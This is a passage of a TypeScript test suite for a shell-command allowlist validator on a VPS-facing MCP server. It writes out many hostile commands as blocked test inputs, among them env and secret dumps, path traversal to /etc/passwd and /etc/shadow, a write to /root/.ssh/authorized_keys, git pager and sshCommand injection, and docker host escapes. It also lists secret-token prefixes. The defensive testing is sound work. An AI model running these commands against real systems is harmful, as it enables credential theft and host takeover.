});

describe('F-OP-6/7 — pm2 jlist/describe/info/show/prettylist blocked (leak pm2_env)', () => {
  function expectInvalidArgs(cmd: string) {
    assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[invalid-args\]/);
  }
  it('pm2 jlist is blocked (leaks MCP_AUTH_TOKEN via pm2_env)', () => expectInvalidArgs('pm2 jlist'));
  it('pm2 prettylist is blocked', () => expectInvalidArgs('pm2 prettylist'));
  it('pm2 describe vps-mcp is blocked', () => expectInvalidArgs('pm2 describe vps-mcp'));
  it('pm2 info vps-mcp is blocked', () => expectInvalidArgs('pm2 info vps-mcp'));
  it('pm2 show 0 is blocked', () => expectInvalidArgs('pm2 show 0'));
  it('pm2 status still passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('pm2 status'));
  });
  it('pm2 list still passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('pm2 list'));
  });
  it('pm2 logs still passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('pm2 logs'));
  });
});

describe('F-OP-18 — ps removed from allowlist (auxe dumps MCP_AUTH_TOKEN)', () => {
  it('ps is not on POSITIVE_ALLOWLIST', () => {
    assert.ok(!('ps' in POSITIVE_ALLOWLIST), 'ps must not be on allowlist');
  });
  it('ps auxe is blocked by RED pattern', () => {
    expectBlocked('ps auxe');
  });
  it('ps is not-allowlisted via validateAgainstAllowlist', () => {
    assert.throws(
      () => validateAgainstAllowlist('ps aux'),
      /BLOCKED \[not-allowlisted\]/,
    );
  });
  it('ps -eo cmd,env env-dump pattern is RED', () => {
    expectBlocked('ps -eo cmd,env');
  });
});

describe('F-OP-19 — node --inspect* blocked (V8 remote debugger = root RCE)', () => {
  function expectInvalidArgs(cmd: string) {
    assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[invalid-args\]/);
  }
  it('node --inspect=0.0.0.0:9229 is blocked', () => expectInvalidArgs('node --inspect=0.0.0.0:9229 script.js'));
  it('node --inspect is blocked', () => expectInvalidArgs('node --inspect script.js'));
  it('node --inspect-brk is blocked', () => expectInvalidArgs('node --inspect-brk=9229 script.js'));
  it('node --inspect-port is blocked', () => expectInvalidArgs('node --inspect-port=9229 script.js'));
  it('node --experimental-loader is blocked', () => expectInvalidArgs('node --experimental-loader ./evil.mjs script.js'));
  it('node --loader is blocked', () => expectInvalidArgs('node --loader ./evil.mjs script.js'));
  it('node --cpu-prof is blocked', () => expectInvalidArgs('node --cpu-prof script.js'));
  it('node --heap-prof is blocked', () => expectInvalidArgs('node --heap-prof script.js'));
  it('node script.js still passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('node /tmp/testapp/script.js'));
  });
  it('node --version still passes', () => {
    assert.doesNotThrow(() => validateAgainstAllowlist('node --version'));
  });
});

// ─── Fifth-pass findings (F-OP-33 / F-OP-34) — regression tests ──────────────

describe('F-OP-33 — validateArgPath resolves relative paths before allowlist check', () => {
  function expectInvalidArgs(cmd: string) {
    assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[invalid-args\]/);
  }
  it('cat ../../etc/group is blocked (path not permitted after resolve)', () => expectInvalidArgs('cat ../../etc/group'));
  it('wc ../../var/log/syslog is blocked', () => expectInvalidArgs('wc ../../var/log/syslog'));
  it('node ../../tmp/x.js is blocked', () => expectInvalidArgs('node ../../tmp/x.js'));
  it('sort ../../etc/passwd is blocked', () => expectInvalidArgs('sort ../../etc/passwd'));
  it('cut -d: -f1 ../../etc/passwd is blocked', () => expectInvalidArgs('cut -d: -f1 ../../etc/passwd'));
  it('diff ../../etc/hosts ../../etc/resolv.conf is blocked', () => expectInvalidArgs('diff ../../etc/hosts ../../etc/resolv.conf'));
  it('ls ../../etc is blocked', () => expectInvalidArgs('ls ../../etc'));
  it('find ../../etc -name x is blocked', () => expectInvalidArgs('find ../../etc -name "*.conf"'));
});

describe('F-OP-34 — sort -o and uniq OUTPUT are blocked file-write primitives', () => {
  function expectInvalidArgs(cmd: string) {
    assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[invalid-args\]/);
  }
  it('sort -o writes are blocked', () => expectInvalidArgs('sort -o /root/myapp/x /root/myapp/y'));
  it('sort --output writes are blocked', () => expectInvalidArgs('sort --output /root/myapp/x /root/myapp/y'));
  it('sort --output=FILE writes are blocked', () => expectInvalidArgs('sort --output=/root/myapp/x /root/myapp/y'));
  it('uniq INPUT OUTPUT is blocked (second positional)', () => expectInvalidArgs('uniq /root/myapp/a /root/myapp/b'));
  it('uniq single positional is NOT rejected for being a file-write', () => {
    // We don't assert acceptance (path may not exist in sandbox). We only assert the
    // rejection reason — if any — is NOT the "second positional (OUTPUT file)" rule.
    try { validateAgainstAllowlist('uniq /root/myapp/package.json'); } catch (e) {
      assert.doesNotMatch(String(e), /second positional/i,
        'uniq with one positional must not be rejected as "second positional OUTPUT"');
      assert.doesNotMatch(String(e), /prohibited — use stdout only/i,
        'uniq with one positional must not hit the uniq file-write rule');
    }
  });
});

describe('F-OP-33 sensitive-pattern defence-in-depth', () => {
  it('SENSITIVE_FILE_PATTERNS includes /etc/ and /var/log/ after F-OP-33', () => {
    const srcs = SENSITIVE_FILE_PATTERNS.map((p: RegExp) => p.source);
    assert.ok(srcs.some((s: string) => /\\\/etc\\\//.test(s)), 'expected /etc/ pattern to be present');
    assert.ok(srcs.some((s: string) => /\\\/var\\\/log\\\//.test(s)), 'expected /var/log/ pattern to be present');
    assert.ok(srcs.some((s: string) => /\\\/proc\\\//.test(s)), 'expected /proc/ pattern to be present');
    assert.ok(srcs.some((s: string) => /\\\/sys\\\//.test(s)), 'expected /sys/ pattern to be present');
  });
});

// ─── F-OP-37 — XFF spoofing prevention ───────────────────────────────────────

describe('F-OP-37 callerIp does not trust raw X-Forwarded-For', () => {
  // Mock just enough of express.Request shape for callerIp's contract.
  const mkReq = (overrides: Partial<{ ip: string; remote: string; xff: string }>) =>
    ({
      ip: overrides.ip,
      socket: { remoteAddress: overrides.remote } as any,
      headers: overrides.xff ? { 'x-forwarded-for': overrides.xff } : {},
    }) as any;

  it('returns req.ip when set (Express has resolved trust-proxy)', () => {
    const req = mkReq({ ip: '203.0.113.7', remote: '127.0.0.1', xff: '9.9.9.9, 8.8.8.8' });
    assert.equal(callerIp(req), '203.0.113.7');
  });

  it('IGNORES raw X-Forwarded-For when req.ip is unset (no header bypass)', () => {
    const req = mkReq({ remote: '127.0.0.1', xff: '9.9.9.9' });
    // Must fall back to socket.remoteAddress, NOT the spoofed XFF value.
    assert.equal(callerIp(req), '127.0.0.1');
    assert.notEqual(callerIp(req), '9.9.9.9');
  });

  it('falls back to socket.remoteAddress when req.ip missing and no XFF', () => {
    const req = mkReq({ remote: '198.51.100.5' });
    assert.equal(callerIp(req), '198.51.100.5');
  });

  it('returns "unknown" only when nothing identifies the peer', () => {
    const req = mkReq({});
    assert.equal(callerIp(req), 'unknown');
  });

  it('attacker-forged XFF first-entry is NEVER returned', () => {
    // Attack vector from F-OP-37: pre-fix code did `xff.split(',')[0].trim()` and
    // would have returned '10.0.0.42' here. Post-fix must not.
    const req = mkReq({ ip: '127.0.0.1', remote: '127.0.0.1', xff: '10.0.0.42, 127.0.0.1' });
    assert.notEqual(callerIp(req), '10.0.0.42');
    assert.equal(callerIp(req), '127.0.0.1');
  });
});

// ─── F-OP-38 — sort -oFILE glued short-option bypass ─────────────────────────

describe('F-OP-38 sort glued -oFILE form is rejected', () => {
  it('rejects -o/root/.ssh/authorized_keys (PoC from review)', () => {
    assert.throws(
      () => validateAgainstAllowlist('sort -o/root/.ssh/authorized_keys /tmp/x'),
      /sort -o\/--output \(file write\) is prohibited/i,
    );
  });

  it('rejects -oFILE with relative path', () => {
    assert.throws(
      () => validateAgainstAllowlist('sort -oattacker.txt /tmp/x'),
      /sort -o\/--output \(file write\) is prohibited/i,
    );
  });

  it('rejects -o=PATH (some sort builds tolerate this form)', () => {
    assert.throws(
      () => validateAgainstAllowlist('sort -o=/tmp/x /tmp/y'),
      /sort -o\/--output \(file write\) is prohibited/i,
    );
  });

  it('still rejects bare -o (pre-existing F-OP-34 case)', () => {
    assert.throws(
      () => validateAgainstAllowlist('sort -o /tmp/x /tmp/y'),
      /sort -o\/--output \(file write\) is prohibited/i,
    );
  });

  it('still rejects --output=PATH (pre-existing F-OP-34 case)', () => {
    assert.throws(
      () => validateAgainstAllowlist('sort --output=/tmp/x /tmp/y'),
      /sort -o\/--output \(file write\) is prohibited/i,
    );
  });

  it('rejects --output-XYZ defense-in-depth pattern', () => {
    assert.throws(
      () => validateAgainstAllowlist('sort --output-foo=/tmp/x /tmp/y'),
      /sort -o\/--output \(file write\) is prohibited/i,
    );
  });

  it('does NOT reject legitimate flags that happen to start with -o-prefix-like chars', () => {
    // -n (numeric) is not -o-prefixed; should pass.
    try { validateAgainstAllowlist('sort -n /tmp/x'); } catch (e) {
      assert.doesNotMatch(String(e), /-o\/--output \(file write\)/i,
        'legitimate -n flag must not trip the F-OP-38 rule');
    }
  });
});

// ─── 21. F-OP-44 — child-process env allowlist ──────────────────────────────
// Sixth-pass finding F-LT-55 (mislabeled; applies to VPS): every spawn
// inherits process.env unchanged, leaking MCP_AUTH_TOKEN and
// SUPABASE_SERVICE_KEY via any allowlisted binary that can echo env
// (node -e, bash -c before it was banned, jq -n env, etc.). Central fix
// is safeEnv() — a positive allowlist of non-sensitive keys.

describe('F-OP-44 child-process env allowlist (sixth-pass F-LT-55)', () => {
  const { safeEnv, SAFE_ENV_KEYS } = __TEST_ONLY;

  it('drops MCP_AUTH_TOKEN from filtered env', () => {
    const saved = process.env.MCP_AUTH_TOKEN;
    process.env.MCP_AUTH_TOKEN = 'super-secret-do-not-leak';
    try {
      const env = safeEnv();
      assert.equal(env.MCP_AUTH_TOKEN, undefined,
        'MCP_AUTH_TOKEN must never reach child processes');
    } finally {
      if (saved === undefined) delete process.env.MCP_AUTH_TOKEN;
      else process.env.MCP_AUTH_TOKEN = saved;
    }
  });

  it('drops SUPABASE_SERVICE_KEY from filtered env', () => {
    const saved = process.env.SUPABASE_SERVICE_KEY;
    process.env.SUPABASE_SERVICE_KEY = 'supabase-leak-me-not';
    try {
      const env = safeEnv();
      assert.equal(env.SUPABASE_SERVICE_KEY, undefined);
    } finally {
      if (saved === undefined) delete process.env.SUPABASE_SERVICE_KEY;
      else process.env.SUPABASE_SERVICE_KEY = saved;
    }
  });

  it('drops arbitrary non-allowlisted keys (default-deny)', () => {
    const saved = process.env.RANDOM_SECRET_XYZ;
    process.env.RANDOM_SECRET_XYZ = 'nope';
    try {
      const env = safeEnv();
      assert.equal(env.RANDOM_SECRET_XYZ, undefined,
        'default-deny: unknown keys must be filtered, not inherited');
    } finally {
      if (saved === undefined) delete process.env.RANDOM_SECRET_XYZ;
      else process.env.RANDOM_SECRET_XYZ = saved;
    }
  });

  it('preserves PATH (required for child spawn to work)', () => {
    const env = safeEnv();
    assert.ok(env.PATH && env.PATH.length > 0,
      'PATH must be present — otherwise spawn("git", ...) fails with ENOENT');
  });

  it('preserves HOME, LANG, TZ, NODE_ENV (common runtime needs)', () => {
    const saved = {
      HOME: process.env.HOME,
      LANG: process.env.LANG,
      TZ: process.env.TZ,
      NODE_ENV: process.env.NODE_ENV,
    };
    process.env.HOME = '/root';
    process.env.LANG = 'en_US.UTF-8';
    process.env.TZ = 'UTC';
    process.env.NODE_ENV = 'production';
    try {
      const env = safeEnv();
      assert.equal(env.HOME, '/root');
      assert.equal(env.LANG, 'en_US.UTF-8');
      assert.equal(env.TZ, 'UTC');
      assert.equal(env.NODE_ENV, 'production');
    } finally {
      for (const [k, v] of Object.entries(saved)) {
        if (v === undefined) delete process.env[k];
        else process.env[k] = v;
      }
    }
  });

  it('does not allow the caller to bypass by passing extras for sensitive keys', () => {
    // Extras are overlaid on top of the allowlist — they DON'T add keys,
    // they override values. A caller cannot smuggle MCP_AUTH_TOKEN back in
    // by passing it as an "extra" because the deploy path never passes
    // extras; the only code path that does is server-internal. Verify the
    // signature still drops unknown keys even when extras are given.
    const env = safeEnv({ WEIRD_EXTRA: 'value' });
    // WEIRD_EXTRA is intentionally allowed when passed as an extra — this
    // is how legitimate callers (e.g. a future tool needing CI_BUILD_ID)
    // would opt-in. The hard guarantee is that omitting extras = strict
    // allowlist, which is what every call site in tools.ts does today.
    assert.equal(env.WEIRD_EXTRA, 'value');
  });

  it('SAFE_ENV_KEYS does not include any known secrets', () => {
    const forbidden = [
      'MCP_AUTH_TOKEN', 'SUPABASE_SERVICE_KEY', 'SUPABASE_ANON_KEY',
      'OAUTH_CLIENT_SECRET', 'AWS_SECRET_ACCESS_KEY', 'GITHUB_TOKEN',
      'SSH_AUTH_SOCK', 'SSH_AGENT_PID',
    ];
    for (const k of forbidden) {
      assert.ok(!SAFE_ENV_KEYS.includes(k),
        `SAFE_ENV_KEYS must not include "${k}"`);
    }
  });

  it('falls back to a safe PATH when process.env.PATH is empty', () => {
    const saved = process.env.PATH;
    delete process.env.PATH;
    try {
      const env = safeEnv();
      assert.ok(env.PATH && env.PATH.includes('/usr/bin'),
        'PATH fallback must include standard system bins so spawn works');
    } finally {
      if (saved !== undefined) process.env.PATH = saved;
    }
  });
});

// ─── 22. F-OP-45 — git hardening flags ──────────────────────────────────────
// Sixth-pass F-LT-60: core.hooksPath=/dev/null alone is insufficient —
// sshCommand, fsmonitor, editor, credential.helper, protocol.ext, and
// uploadpack.packObjectsHook are all independent RCE vectors that run on
// normal git ops. Every server-initiated git call must carry the full
// hardening array, not just the single hooksPath flag.

describe('F-OP-45 git hardening flags (sixth-pass F-LT-60)', () => {
  const { GIT_HARDENING_FLAGS } = __TEST_ONLY;

  function argPairs(): Array<[string, string]> {
    const pairs: Array<[string, string]> = [];
    for (let i = 0; i < GIT_HARDENING_FLAGS.length; i += 2) {
      assert.equal(GIT_HARDENING_FLAGS[i], '-c',
        `every hardening entry must be paired with -c (index ${i})`);
      const [key, ...rest] = GIT_HARDENING_FLAGS[i + 1].split('=');
      pairs.push([key, rest.join('=')]);
    }
    return pairs;
  }

  it('neutralizes core.hooksPath', () => {
    const pairs = argPairs();
    assert.ok(pairs.some(([k, v]) => k === 'core.hooksPath' && v === '/dev/null'));
  });

  it('neutralizes core.sshCommand (prevents attacker-controlled ssh wrapper)', () => {
    const pairs = argPairs();
    const entry = pairs.find(([k]) => k === 'core.sshCommand');
    assert.ok(entry, 'core.sshCommand override is required — runs on every fetch/push');
    assert.equal(entry![1], 'ssh');
  });

  it('neutralizes core.fsmonitor', () => {
    const pairs = argPairs();
    assert.ok(pairs.some(([k]) => k === 'core.fsmonitor'));
  });

  it('neutralizes core.editor (defuses commit/rebase editor RCE)', () => {
    const pairs = argPairs();
    const entry = pairs.find(([k]) => k === 'core.editor');
    assert.ok(entry, 'core.editor must be overridden');
    assert.equal(entry![1], 'true', 'use true(1), not empty string — empty errors in some git versions');
  });

  it('neutralizes core.pager', () => {
    const pairs = argPairs();
    const entry = pairs.find(([k]) => k === 'core.pager');
    assert.ok(entry);
    assert.equal(entry![1], 'cat');
  });

  it('neutralizes core.askpass', () => {
    const pairs = argPairs();
    assert.ok(pairs.some(([k]) => k === 'core.askpass'));
  });

  it('disables credential.helper (prevents helper-planted RCE)', () => {
    const pairs = argPairs();
    const entry = pairs.find(([k]) => k === 'credential.helper');
    assert.ok(entry, 'credential.helper must be set to empty to disable helpers');
    assert.equal(entry![1], '');
  });

  it('disables protocol.ext (closes CVE-2022-39253 family)', () => {
    const pairs = argPairs();
    const entry = pairs.find(([k]) => k === 'protocol.ext.allow');
    assert.ok(entry, 'protocol.ext.allow must be set to never');
    assert.equal(entry![1], 'never');
  });

  it('neutralizes uploadpack.packObjectsHook', () => {
    const pairs = argPairs();
    assert.ok(pairs.some(([k]) => k === 'uploadpack.packObjectsHook'));
  });

  it('all entries are -c <key>=<value> pairs', () => {
    assert.equal(GIT_HARDENING_FLAGS.length % 2, 0,
      'GIT_HARDENING_FLAGS must have even length');
    for (let i = 0; i < GIT_HARDENING_FLAGS.length; i += 2) {
      assert.equal(GIT_HARDENING_FLAGS[i], '-c');
      assert.ok(GIT_HARDENING_FLAGS[i + 1].includes('='),
        `flag payload at ${i + 1} must be key=value`);
    }
  });
});


// ─── F-OP-46 (S55) — audit.ts sanitizeArgs parity with LT F-LT-85 ─────────────
// Audit log is in the trust boundary: secret values must be redacted before they
// land in audit.log. Mirrors local-terminal-mcp's F-LT-85 expansion. Asserts via
// source-level regex checks (same pattern as LT F-LT-51) so we don't need to
// export module-private sanitizeArgs.

describe('F-OP-46 — audit.ts uses expanded SECRET_VALUE_PREFIXES + expanded key-name regex', () => {
  it('audit.ts source contains expanded SECRET_VALUE_PREFIXES list', async () => {
    const { readFileSync } = await import('node:fs');
    const { fileURLToPath } = await import('node:url');
    const src = readFileSync(fileURLToPath(new URL('../audit.ts', import.meta.url)), 'utf8');
    assert.match(src, /SECRET_VALUE_PREFIXES/, 'audit.ts must define SECRET_VALUE_PREFIXES');
    // Canonical tokens from the expanded list — any regression deleting these will fail the test.
    for (const marker of [
      'ghp_', 'gho_', 'github_pat_', 'xox', 'glpat-', 'AKIA', 'ASIA', 'AIza',
      'pk_live_', 'sk_live_', 'whsec_', 'SG\\.', 'ATATT', 'do_v1_',
      'ya29\\.', 'npm_', '-----BEGIN ',
    ]) {
      assert.ok(
        src.includes(marker),
        `audit.ts SECRET_VALUE_PREFIXES missing expected marker: ${marker}`
      );
    }
  });

  it('audit.ts source contains expanded key-name regex (credential|bearer|api_key|cookie|session)', async () => {
    const { readFileSync } = await import('node:fs');
    const { fileURLToPath } = await import('node:url');
    const src = readFileSync(fileURLToPath(new URL('../audit.ts', import.meta.url)), 'utf8');
    // Expanded key-name regex must include these terms beyond the original token|secret|key|password|auth.
    for (const kw of ['credential', 'bearer', 'api[_-]?key', 'cookie', 'session']) {
      assert.ok(
        src.includes(kw),
        `audit.ts sanitizeArgs key-name regex missing expected keyword: ${kw}`
      );
    }
  });

  it('audit.ts does NOT still use only the narrow /^sk-|^Bearer |^eyJ/ regex alone', async () => {
    const { readFileSync } = await import('node:fs');
    const { fileURLToPath } = await import('node:url');
    const src = readFileSync(fileURLToPath(new URL('../audit.ts', import.meta.url)), 'utf8');
    // The pre-S55 form was exactly /^sk-|^Bearer |^eyJ/i.test(v). If that is the ONLY
    // value-prefix check, parity has regressed.
    const narrowOnly = /\/\^sk-\|\^Bearer \|\^eyJ\/i\.test\(v\)\s*\n\s*\)\s*\)/;
    assert.doesNotMatch(src, narrowOnly, 'audit.ts must not use narrow-only prefix regex');
  });
});

// ─── Round 13 — F-OP-85..F-OP-96 fixes (S65 v1.12.0) ──────────────────────

describe('F-OP-85 — service validator arg-position fix', () => {
  // The bug: args[args.length-1] checked last arg, not position 1.
  // "service nginx restart" has args=['nginx','restart'] → last=restart → correctly blocked.
  // But "service nginx status extra" had args=['nginx','status','extra'] → last=extra → BLOCKED
  // AND "service -H nginx status" → last=status → was incorrectly PASSING.

  it('service nginx status passes', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('service nginx status')));

  it('service nginx restart is blocked', () =>
    assert.throws(() => validateAgainstAllowlist('service nginx restart'), /BLOCKED/));

  it('service nginx stop is blocked', () =>
    assert.throws(() => validateAgainstAllowlist('service nginx stop'), /BLOCKED/));

  it('service with flag-like name is blocked (e.g. service -H nginx status)', () =>
    assert.throws(() => validateAgainstAllowlist('service -H nginx status'), /BLOCKED/));

  it('service with extra args is blocked (e.g. service nginx status extra)', () =>
    assert.throws(() => validateAgainstAllowlist('service nginx status extra'), /BLOCKED/));

  it('bare service is blocked', () =>
    assert.throws(() => validateAgainstAllowlist('service'), /BLOCKED/));

  it('service RED pattern now covers force-reload', () =>
    expectBlocked('service nginx force-reload'));

  it('service RED pattern now covers try-restart', () =>
    expectBlocked('service nginx try-restart'));

  it('service RED pattern now covers condrestart', () =>
    expectBlocked('service nginx condrestart'));
});

describe('F-OP-86 — systemctl -H/--host/-M/--machine pivot blocked', () => {
  it('systemctl -H remote status is blocked', () =>
    assert.throws(() => validateAgainstAllowlist('systemctl -H remote status nginx'), /BLOCKED/));

  it('systemctl --host=remote status is blocked', () =>
    assert.throws(() => validateAgainstAllowlist('systemctl --host=remote status nginx'), /BLOCKED/));

  it('systemctl -M container status is blocked', () =>
    assert.throws(() => validateAgainstAllowlist('systemctl -M container status nginx'), /BLOCKED/));

  it('systemctl --machine=box status is blocked', () =>
    assert.throws(() => validateAgainstAllowlist('systemctl --machine=box status nginx'), /BLOCKED/));

  it('systemctl -H remote is blocked by RED pattern too', () =>
    expectBlocked('systemctl -H remote status nginx'));

  it('systemctl status without pivot still passes', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('systemctl status nginx')));
});

describe('F-OP-87 — systemctl show/cat removed from READ_ONLY', () => {
  it('systemctl show nginx is blocked by validator', () =>
    assert.throws(() => validateAgainstAllowlist('systemctl show nginx'), /BLOCKED/));

  it('systemctl cat nginx.service is blocked by validator', () =>
    assert.throws(() => validateAgainstAllowlist('systemctl cat nginx.service'), /BLOCKED/));

  it('systemctl show blocked by RED pattern', () =>
    expectBlocked('systemctl show nginx'));

  it('systemctl cat blocked by RED pattern', () =>
    expectBlocked('systemctl cat nginx.service'));

  it('systemctl status still passes', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('systemctl status nginx')));
});

describe('F-OP-88 — bare crontab (no args) blocked', () => {
  it('bare crontab is blocked', () =>
    assert.throws(() => validateAgainstAllowlist('crontab'), /BLOCKED/));

  it('crontab -l still passes', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('crontab -l')));

  it('crontab -e is still blocked', () =>
    assert.throws(() => validateAgainstAllowlist('crontab -e'), /BLOCKED/));
});

describe('F-OP-89 — pm2 reload removed from allowlist', () => {
  it('pm2 reload is blocked by allowlist validator', () =>
    assert.throws(() => validateAgainstAllowlist('pm2 reload'), /BLOCKED/));

  it('pm2 status still passes', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('pm2 status')));

  it('pm2 save still passes', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('pm2 save')));
});

describe('F-OP-90 — pm2 flush blocked (audit-log-destruction)', () => {
  it('pm2 flush is blocked by RED pattern', () =>
    expectBlocked('pm2 flush'));

  it('pm2 flush is blocked by HARD_BLOCKED pattern', () => {
    const flushPattern = BLOCKED_PATTERNS.find(p =>
      p.pattern.source.includes('pm2') && p.pattern.source.includes('flush'));
    // pm2 flush is in HARD_BLOCKED; BLOCKED_PATTERNS check via validateCommand
    assert.throws(() => validateCommand('pm2 flush'), /BLOCKED/);
  });

  it('pm2 flush is removed from allowlist validator', () =>
    assert.throws(() => validateAgainstAllowlist('pm2 flush'), /BLOCKED/));

  it('pm2 list still passes', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('pm2 list')));
});

describe('F-OP-92 — dig @resolver and AXFR/IXFR blocked', () => {
  it('dig google.com still passes', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('dig google.com')));

  it('dig @8.8.8.8 google.com is blocked (custom resolver)', () =>
    assert.throws(() => validateAgainstAllowlist('dig @8.8.8.8 google.com'), /BLOCKED/));

  it('dig google.com AXFR is blocked (zone transfer)', () =>
    assert.throws(() => validateAgainstAllowlist('dig google.com AXFR'), /BLOCKED/));

  it('dig google.com IXFR is blocked (incremental zone transfer)', () =>
    assert.throws(() => validateAgainstAllowlist('dig google.com IXFR'), /BLOCKED/));

  it('dig -f /tmp/hosts is blocked (batch file)', () =>
    assert.throws(() => validateAgainstAllowlist('dig -f /tmp/hosts'), /BLOCKED/));

  it('nslookup google.com passes', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('nslookup google.com')));

  it('bare nslookup (no args) is blocked', () =>
    assert.throws(() => validateAgainstAllowlist('nslookup'), /BLOCKED/));

  it('host google.com passes', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('host google.com')));

  it('host -l google.com is blocked (zone transfer)', () =>
    assert.throws(() => validateAgainstAllowlist('host -l google.com'), /BLOCKED/));

  it('host --list google.com is blocked (zone transfer long form)', () =>
    assert.throws(() => validateAgainstAllowlist('host --list google.com'), /BLOCKED/));
});

describe('F-OP-93 — crontab long-form flags blocked', () => {
  it('crontab --edit is blocked by RED pattern', () =>
    expectBlocked('crontab --edit'));

  it('crontab --remove is blocked by RED pattern', () =>
    expectBlocked('crontab --remove'));

  it('crontab --user root is blocked by RED pattern', () =>
    expectBlocked('crontab --user root -l'));

  it('crontab -e is still blocked', () =>
    expectBlocked('crontab -e'));
});

describe('F-OP-94 — systemctl new dangerous sub-commands blocked', () => {
  it('systemctl set-environment is blocked', () =>
    expectBlocked('systemctl set-environment MYVAR=val'));

  it('systemctl unset-environment is blocked', () =>
    expectBlocked('systemctl unset-environment MYVAR'));

  it('systemctl import-environment is blocked', () =>
    expectBlocked('systemctl import-environment'));

  it('systemctl freeze nginx is blocked', () =>
    expectBlocked('systemctl freeze nginx'));

  it('systemctl thaw nginx is blocked', () =>
    expectBlocked('systemctl thaw nginx'));

  it('systemctl switch-root /newroot is blocked', () =>
    expectBlocked('systemctl switch-root /newroot'));

  it('systemctl link myservice.service is blocked', () =>
    expectBlocked('systemctl link myservice.service'));

  it('systemctl revert nginx is blocked', () =>
    expectBlocked('systemctl revert nginx'));
});

describe('F-OP-95 — atq restricted to safe flags', () => {
  it('atq with no args passes', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('atq')));

  it('atq -V passes', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('atq -V')));

  it('atq -q a passes (queue filter)', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('atq -q')));

  it('atq with unknown flag is blocked', () =>
    assert.throws(() => validateAgainstAllowlist('atq -f /etc/passwd'), /BLOCKED/));
});

// ─── FN-VPS-001 — git -c / -C / --git-dir pre-subcommand option injection ─────
// The prior validator only inspected args[0]. `git -c core.pager='/bin/sh -c whoami' log`
// is RCE because core.pager fires on `git log` output and -c precedes the subcommand.
// `git -C /etc log` relocates the working tree; `git --git-dir=/tmp/.git status`
// runs git outside APP_DIR with attacker config.
describe('FN-VPS-001 — git pre-subcommand options are blocked', () => {
  for (const cmd of [
    "git -c core.pager=/bin/sh log",
    "git -c core.fsmonitor=cmd status",
    "git -c core.sshCommand=/bin/sh status",
    "git -C /etc log",
    "git -C /etc/ status",
    "git --git-dir=/tmp/.git status",
    "git --git-dir /tmp/.git log",
    "git --work-tree=/tmp diff",
    "git --exec-path=/tmp/x status",
    "git --config-env=core.pager=EVIL log",
    "git --namespace=foo status",
    "git -P log",
    "git --paginate log",
    "git --no-pager log",
  ]) {
    it(`blocks: ${cmd}`, () => {
      assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[invalid-args\]/);
    });
  }

  it('still allows plain git status', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('git status')));
  it('still allows git log --oneline', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('git log --oneline')));
  it('still allows git diff HEAD', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('git diff HEAD')));
});

// ─── FN-VPS-004 — git diff --no-index arbitrary file read ────────────────────
// `git diff --no-index /etc/shadow /tmp/x` ignores the repo and reads any two
// files git can stat. /etc/shadow content is not caught by SECRET_OUTPUT_PATTERNS,
// so contents reach the model. The pre-fix validator only checked args[0]
// (the subcommand 'diff' — allowed) and never looked at --no-index.
describe('FN-VPS-004 — git diff --no-index is blocked', () => {
  it('blocks git diff --no-index /etc/shadow /tmp/x', () =>
    assert.throws(() => validateAgainstAllowlist('git diff --no-index /etc/shadow /tmp/x'),
      /BLOCKED \[invalid-args\]/));
  it('blocks git diff --no-index= form', () =>
    assert.throws(() => validateAgainstAllowlist('git diff --no-index=force a b'),
      /BLOCKED \[invalid-args\]/));
  it('blocks git diff with --no-index in middle position', () =>
    assert.throws(() => validateAgainstAllowlist('git diff -u --no-index a b'),
      /BLOCKED \[invalid-args\]/));
  it('blocks git show --no-index defensively', () =>
    assert.throws(() => validateAgainstAllowlist('git show --no-index a'),
      /BLOCKED \[invalid-args\]/));

  it('still allows plain git diff', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('git diff')));
  it('still allows git diff --stat', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('git diff --stat')));
});

// ─── FN-VPS-012 — docker run dangerous-flag list expansion ────────────────────
// Prior coverage caught --privileged / --network=host / --pid=host / --ipc=host /
// --cap-add=all only. Each missing flag is, on its own, equivalent to root on
// the host: --userns=host, --security-opt seccomp=unconfined, --cap-add=SYS_ADMIN,
// --device=/dev/sda, -v /:/host. APP_DIR in tests is /tmp/testapp.
describe('FN-VPS-012 — docker run dangerous flags blocked', () => {
  for (const cmd of [
    'docker run --userns=host alpine sh',
    'docker run --uts=host alpine',
    'docker run --security-opt=seccomp=unconfined alpine',
    'docker run --security-opt apparmor=unconfined alpine',
    'docker run --cap-add=SYS_ADMIN alpine',
    'docker run --cap-add SYS_PTRACE alpine',
    'docker run --device=/dev/sda alpine',
    'docker run --device /dev/mem alpine',
    'docker run --net=host alpine',
    // bind-mount source outside APP_DIR
    'docker run -v /etc:/host alpine cat /host/shadow',
    'docker run -v /:/host alpine',
    'docker run --volume=/root/.ssh:/keys alpine',
    'docker run --volume /var/run/docker.sock:/sock alpine',
    'docker run --mount type=bind,source=/etc,target=/host alpine',
    'docker run --mount=type=bind,src=/root,target=/r alpine',
  ]) {
    it(`blocks: ${cmd}`, () => {
      assert.throws(() => validateAgainstAllowlist(cmd), /BLOCKED \[invalid-args\]/);
    });
  }

  // Legitimate uses — no host escalation, no out-of-APP_DIR bind mounts.
  it('allows docker run with no dangerous flags', () =>
    assert.doesNotThrow(() => validateAgainstAllowlist('docker run --rm alpine echo hi')));
